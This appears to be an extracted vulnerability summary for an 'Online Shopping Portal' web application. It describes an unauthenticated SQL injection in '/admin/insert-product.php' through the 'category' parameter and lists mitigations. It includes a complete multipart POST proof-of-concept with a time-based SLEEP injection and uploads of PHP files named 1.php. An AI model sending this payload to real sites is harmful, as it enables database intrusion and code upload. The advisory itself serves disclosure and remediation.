Here's the extracted information:\n\n**Root cause of vulnerability:**\n\n*   A SQL injection vulnerability was found in the '/admin/insert-product.php' file of the 'Online Shopping Portal' project. The reason for this issue is that attackers inject malicious code from the parameter 'category' and use it directly in SQL queries without the need for appropriate cleaning or validation.\n\n**Weaknesses/vulnerabilities present:**\n\n*   SQL injection\n\n**Impact of exploitation:**\n\n*   Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption.\n\n**Attack vectors:**\n\n*   The '/admin/insert-product.php' file is vulnerable via the 'category' parameter.\n*   No login or authorization is required to exploit this vulnerability.\n\n**Required attacker capabilities/position:**\n\n*   An attacker needs to be able to send a crafted POST request to '/admin/insert-product.php' with a malicious payload in the 'category' parameter.\n\n**Mitigation or fix:**\n\n*   Use prepared statements and parameter binding.\n*   Input validation and filtering.\n*   Minimize database user permissions.\n*   Regular security audits.\n\n**Payload Example:**\n\n```\nParameter: MULTIPART category ((custom) POST)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: ------WebKitFormBoundary5bjMk190APFtS4EY\nContent-Disposition: form-data; name=\"category\"\n\n3' AND (SELECT 1985 FROM (SELECT(SLEEP(5)))wPsG) AND 'pwjZ'='pwjZ\n------WebKitFormBoundary5bjMk190APFtS4EY\nContent-Disposition: form-data; name=\"subcategory\"\n\n8\n------WebKitFormBoundary5bjMk190APFtS4EY\nContent-Disposition: form-data; name=\"productName\"\n\n1\n------WebKitFormBoundary5bjMk190APFtS4EY\nContent-Disposition: form-data; name=\"productCompany\"\n\n1\n------WebKitFormBoundary5bjMk190APFtS4EY\nContent-Disposition: form-data; name=\"productpricebd\"\n\n1\n------WebKitFormBoundary5bjMk190APFtS4EY\nContent-Disposition: form-data; name=\"productprice\"\n\n1\n------WebKitFormBoundary5bjMk190APFtS4EY\nContent-Disposition: form-data; name=\"productDescription\"\n\n1\n------WebKitFormBoundary5bjMk190APFtS4EY\nContent-Disposition: form-data; name=\"productShippingcharge\"\n\n1\n------WebKitFormBoundary5bjMk190APFtS4EY\nContent-Disposition: form-data; name=\"productAvailability\"\n\nIn Stock\n------WebKitFormBoundary5bjMk190APFtS4EY\nContent-Disposition: form-data; name=\"productimage1\"; filename=\"1.php\"\nContent-Type: text/php\n\n<?php phpinfo();?>\n------WebKitFormBoundary5bjMk190APFtS4EY\nContent-Disposition: form-data; name=\"productimage2\"; filename=\"1.php\"\nContent-Type: text/php\n\n<?php phpinfo();?>\n------WebKitFormBoundary5bjMk190APFtS4EY\nContent-Disposition: form-data; name=\"productimage3\"; filename=\"1.php\"\nContent-Type: text/php\n\n<?php phpinfo();?>\n------WebKitFormBoundary5bjMk190APFtS4EY\nContent-Disposition: form-data; name=\"submit\"\n```\n\n**Note:** This content provides significantly more detail than a typical CVE description, including a proof-of-concept (POC) payload and suggested remediation steps.",

The description mentions that the manipulation of the `Category` argument in `/admin/insert-product.php` leads to the **SQL injection**.
